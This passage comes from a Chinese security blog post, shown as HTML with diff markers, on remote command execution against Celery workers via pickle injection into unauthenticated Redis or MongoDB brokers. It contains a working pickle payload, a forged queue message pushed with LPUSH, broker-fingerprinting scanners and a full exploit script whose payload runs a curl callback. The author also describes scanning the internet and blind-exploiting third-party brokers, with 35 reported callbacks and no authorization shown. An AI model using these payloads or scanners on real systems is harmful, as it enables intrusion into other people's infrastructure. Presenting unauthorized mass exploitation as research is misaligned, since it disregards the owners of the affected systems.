class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在上面的消息数据中，<code>properties</code> 里包含了消息的路由信息和标识性的 UUID 值，而其中<code>properties.body_encoding</code> 的值则表示消息主体 <code>body</code> 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 <code>properties.body_encoding</code> 的值对消息主体 <code>body</code> 进行解码，即 <code>base64.b64decode(body)</code>，而消息数据中的 <code>content-type</code> 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 <code>pickle</code> 对任务数据进行的序列化。</p>
+<p>将消息主体经 base64 解码和反序列化（即之前 <code>unserializer.py</code> 文件功能） 操作以后得到具体的任务数据：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/9.png" alt=""></p>
+<p>格式化任务数据为：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'args': (4, 9),  // 传递进 celery_simple.add 函数中的参数</span><br><span class="line">    'timelimit': (None, None),  // celery Task 任务执行时间限制</span><br><span class="line">    'expires': None,</span><br><span class="line">    'taskset': None,</span><br><span class="line">    'kwargs': &#123;&#125;,</span><br><span class="line">    'retries': 0,</span><br><span class="line">    'callbacks': None,  // Task 任务回调</span><br><span class="line">    'chord': None,</span><br><span class="line">    'id': '1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe',  // 任务唯一 ID</span><br><span class="line">    'eta': None,</span><br><span class="line">    'errbacks': None,</span><br><span class="line">    'task': 'celery_simple.add',  // 任务执行的具体方法</span><br><span class="line">    'utc': True</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 <code>pickle</code> 对消息主体进行反序列化。</p>
+<h4 id="3-构造恶意消息数据"><a href="#3-构造恶意消息数据" class="headerlink" title="3. 构造恶意消息数据"></a>3. 构造恶意消息数据</h4><p>那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。</p>
+<p>这里直接对消息主体 <code>body</code> 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LS</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getstatusoutput, (<span class="string">'ls'</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(LS())))</span><br></pre></td></tr></table></figure>
+<p>运行程序生成具体 Payload 数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou</span><br></pre></td></tr></table></figure>
+<p>使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"body"</span>: <span class="string">"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou"</span>,</span><br><span class="line">    <span class="attr">"headers"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"content-encoding"</span>: <span class="string">"binary"</span>,</span><br><span class="line">    <span class="attr">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"body_encoding"</span>: <span class="string">"base64"</span>,</span><br><span class="line">        <span class="attr">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,</span><br><span class="line">        <span class="attr">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,</span><br><span class="line">        <span class="attr">"delivery_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"routing_key"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"exchange"</span>: <span class="string">"celery"</span>,</span><br><span class="line">            <span class="attr">"priority"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"delivery_mode"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">"delivery_tag"</span>: <span class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将假消息通过 Redis 命令行直接添加到 <code>celery</code> 队列任务中：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LPUSH celery <span class="string">'&#123;"body":"Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou","headers":&#123;&#125;,"content-encoding":"binary","content-type":"application/x-python-serialize","properties":&#123;"body_encoding":"base64","reply_to":"c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id":"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info":&#123;"routing_key":"celery","exchange":"celery","priority":0&#125;,"delivery_mode":2,"delivery_tag":"027bd89a-389e-41d1-857a-ba895e6eccda"&#125;&#125;'</span></span><br></pre></td></tr></table></figure>
+<p>查看一下 <code>celery</code> 队列中的消息情况：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/10.png" alt=""></p>
+<p>然后起一个 Celery worker 端加载之前的 <code>celery_simple.py</code> 中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/11.png" alt=""></p>
+<p>worker 端经过 <code>pickle.loads(base64.b64decode(body))</code> 处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了 <code>pickle</code> 序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。</p>
+<h3 id="三、利用脆弱的-Broker-代理进行分布式节点攻击"><a href="#三、利用脆弱的-Broker-代理进行分布式节点攻击" class="headerlink" title="三、利用脆弱的 Broker 代理进行分布式节点攻击"></a>三、利用脆弱的 Broker 代理进行分布式节点攻击</h3><p>前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/12.png" alt=""></p>
+<h3 id="1-检测-Celery-应用中-Broker-特征"><a href="#1-检测-Celery-应用中-Broker-特征" class="headerlink" title="1. 检测 Celery 应用中 Broker 特征"></a>1. 检测 Celery 应用中 Broker 特征</h3><p>那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。</p>
+<p>所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_kombu.binding.*</span><br><span class="line">celery.*</span><br><span class="line">unacked.*</span><br></pre></td></tr></table></figure>
+<p>而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">messages</span><br><span class="line">messages.broadcast</span><br><span class="line">messages.routing</span><br></pre></td></tr></table></figure>
+<p>其中 <code>messages.routing</code> 含有每一个队列以及消息路由的信息，<code>messages</code> 则存储了所有队列中的消息数据。</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/13.png" alt=""></p>
+<p>那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。</p>
+<p>针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_redis_check.py</span></span><br><span class="line">...</span><br><span class="line">CELERY_KEYS = [<span class="string">'celery'</span>, <span class="string">'unacked'</span>, <span class="string">'_kombu.binding'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">6379</span></span><br><span class="line">    r = redis.Redis(ip, int(port), socket_connect_timeout=<span class="number">5</span>)</span><br><span class="line">    keys = r.keys()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, keys=list())</span><br><span class="line">    <span class="keyword">for</span> _k <span class="keyword">in</span> CELERY_KEYS:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">if</span> _k <span class="keyword">in</span> key:</span><br><span class="line">                info[<span class="string">'succeed'</span>] = <span class="keyword">True</span></span><br><span class="line">                info[<span class="string">'keys'</span>].append(key)</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 <code>[&#39;celery&#39;, &#39;unacked&#39;, &#39;_kombu.binding&#39;]</code> 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_mongodb_check.py</span></span><br><span class="line">...</span><br><span class="line">CELERY_COLLECTIONS = [<span class="string">'messages.routing'</span>, <span class="string">'messages.broadcast'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">27017</span></span><br><span class="line">    conn = pymongo.MongoClient(ip, int(port), connectTimeoutMS=<span class="number">2000</span>,</span><br><span class="line">                               serverSelectionTimeoutMS=<span class="number">2000</span>)</span><br><span class="line">    dbs = conn.database_names()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, results=dict())</span><br><span class="line">    <span class="keyword">for</span> db <span class="keyword">in</span> dbs:</span><br><span class="line">        colnames = conn.get_database(db).collection_names()</span><br><span class="line">        <span class="keyword">for</span> _col <span class="keyword">in</span> CELERY_COLLECTIONS:</span><br><span class="line">            <span class="keyword">if</span> any(_col <span class="keyword">in</span> colname <span class="keyword">for</span> colname <span class="keyword">in</span> colnames):</span><br><span class="line">                info[<span class="string">'succeed'</span>] = <span class="keyword">True</span></span><br><span class="line">                info[<span class="string">'results'</span>][db] = colnames</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。</p>
+<h4 id="2-使用脚本进行消息注入攻击分布式节点"><a href="#2-使用脚本进行消息注入攻击分布式节点" class="headerlink" title="2. 使用脚本进行消息注入攻击分布式节点"></a>2. 使用脚本进行消息注入攻击分布式节点</h4><p>使用上面两个脚本在本地环境进行测试：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/14.png" alt=""></p>
+<p>这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 <code>pickle</code> 的序列化方式，<strong>若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了</strong>。</p>
+<p>一个简单的真对 Redis Broker 类型的攻击脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># celery_broker_redis_exp.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">evil_command = <span class="string">'curl http://127.0.0.1:8000/&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_evil_task_body</span><span class="params">(command, body_encoding=<span class="string">'base64'</span>)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Command</span><span class="params">(object)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">import</span> os</span><br><span class="line">            <span class="keyword">return</span> (os.system, (command, ))</span><br><span class="line">    <span class="keyword">if</span> body_encoding == <span class="string">'base64'</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(pickle.dumps(Command()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_evil_message</span><span class="params">(body)</span>:</span></span><br><span class="line">    message = &#123;<span class="string">"body"</span>: body,<span class="string">"headers"</span>: &#123;&#125;,<span class="string">"content-encoding"</span>: <span class="string">"binary"</span>,<span class="string">"content-type"</span>: <span class="string">"application/x-python-serialize"</span>,<span class="string">"properties"</span>: &#123;<span class="string">"body_encoding"</span>: <span class="string">"base64"</span>,<span class="string">"reply_to"</span>: <span class="string">"c8b55284-c490-3927-85c5-c68a7fed0525"</span>,<span class="string">"correlation_id"</span>: <span class="string">"1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe"</span>,<span class="string">"delivery_info"</span>: &#123;<span class="string">"routing_key"</span>: <span class="string">"celery"</span>,<span class="string">"exchange"</span>: <span class="string">"celery"</span>,<span class="string">"priority"</span>: <span class="number">0</span>&#125;,<span class="string">"delivery_mode"</span>: <span class="number">2</span>,<span class="string">"delivery_tag"</span>: <span class="string">"027bd89a-389e-41d1-857a-ba895e6eccda"</span>&#125;&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip, port = seed.split(<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> ex:</span><br><span class="line">        ip, port = seed, <span class="number">6379</span></span><br><span class="line">    r = redis.Redis(ip, int(port), socket_connect_timeout=<span class="number">5</span>)</span><br><span class="line">    keys = r.keys()</span><br><span class="line">    info = dict(succeed=<span class="keyword">False</span>, keys=list())</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        matched = re.search(<span class="string">r'^_kombu\.binding\.(?P&lt;queue&gt;.*)'</span>, key)</span><br><span class="line">        <span class="keyword">if</span> matched:</span><br><span class="line">            queue_name = matched.group(<span class="string">'queue'</span>)</span><br><span class="line">            message = create_evil_message(</span><br><span class="line">                create_evil_task_body(evil_command.format(queue_name))</span><br><span class="line">            )</span><br><span class="line">            r.lpush(queue_name, message)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'192.168.99.100'</span>)</span><br></pre></td></tr></table></figure>
+<p>为了测试攻击脚本，首先需要在 <code>192.168.99.100</code> 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">celery worker --broker=&apos;redis://:@192.168.99.100/0&apos;</span><br></pre></td></tr></table></figure>
+<p>整个过程演示：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/15.gif" alt=""></p>
+<p>可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。</p>
+<h3 id="四、互联网案例检测"><a href="#四、互联网案例检测" class="headerlink" title="四、互联网案例检测"></a>四、互联网案例检测</h3><p>上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：</p>
+<ol>
+<li>找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；</li>
+<li>往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 <code>pickle</code> 方式序列化，所以会进行 Payload 盲打；</li>
+<li>等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；</li>
+</ol>
+<p>首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有 <strong>14000+</strong> 个，而未授权访问的 MongoDB 同样也有 <strong>14000+</strong> 个。</p>
+<p>针对 <strong>14000+</strong> 个存在未授权访问的 Redis 服务使用上一节的验证脚本（<code>celery_broker_redis_check.py</code>）进行批量检测，得到了 <strong>86</strong> 个目标满足要求，扫描过程截图：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/16.png" alt=""></p>
+<p>同样的针对 <strong>14000+</strong> 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 <strong>22</strong> 个目标满足要求，扫描过程截图：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/17.png" alt=""></p>
+<p>根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。</p>
+<p>由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。</p>
+<p>针对 Redis 检测过程截图：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/18.png" alt=""></p>
+<p>其中服务器上收到了 <strong>32</strong> 个成功执行命令并回连的请求：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/19.png" alt=""></p>
+<p>同样的针对 MongoDB 检测过程截图：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/20.png" alt=""></p>
+<p>其中服务器上成功收到 <strong>3</strong> 个成功执行命令并回连的请求：</p>
+<p><img src="/images/articles//2016-09-22-attacking-distributed-nodes-by-message-queue-injection/21.png" alt=""></p>
+<p>从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。</p>
+<p><strong>（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）</strong></p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul>
+<li><a href="http://www.celeryproject.org/" target="_blank" rel="noopener">Celery 分布式框架项目 - http://www.celeryproject.org/</a></li>
+<li><a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">Python “pickle” 模块文档 - https://docs.python.org/2/library/pickle.html</a></li>
+<li><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html">Django 远程命令执行漏洞详解 - http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、老生常谈-Python-序列化"><span class="toc-number">1.</span> <span class="toc-text">一、老生常谈 Python 序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-简单的序列化例子"><span class="toc-number">1.1.</span> <span class="toc-text">1. 简单的序列化例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Trick-使得反序列化变得危险"><span class="toc-number">1.2.</span> <span class="toc-text">2. Trick 使得反序列化变得危险</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、分布式框架-Celery"><span class="toc-number">2.</span> <span class="toc-text">二、分布式框架 Celery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-使用框架进行简单的任务下发"><span class="toc-number">2.1.</span> <span class="toc-text">1. 使用框架进行简单的任务下发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-框架中的消息封装方式"><span class="toc-number">2.2.</span> <span class="toc-text">2. 框架中的消息封装方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-构造恶意消息数据"><span class="toc-number">2.3.</span> <span class="toc-text">3. 构造恶意消息数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、利用脆弱的-Broker-代理进行分布式节点攻击"><span class="toc-number">3.</span> <span class="toc-text">三、利用脆弱的 Broker 代理进行分布式节点攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-检测-Celery-应用中-Broker-特征"><span class="toc-number">4.</span> <span class="toc-text">1. 检测 Celery 应用中 Broker 特征</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-使用脚本进行消息注入攻击分布式节点"><span class="toc-number">4.1.</span> <span class="toc-text">2. 使用脚本进行消息注入攻击分布式节点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、互联网案例检测"><span class="toc-number">5.</span> <span class="toc-text">四、互联网案例检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接"><span class="toc-number">6.</span> <span class="toc-text">相关链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&text=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&is_video=false&description=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞组合拳 - 攻击分布式节点&body=Check out this article: http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&title=漏洞组合拳 - 攻击分布式节点"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/&name=漏洞组合拳 - 攻击分布式节点&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
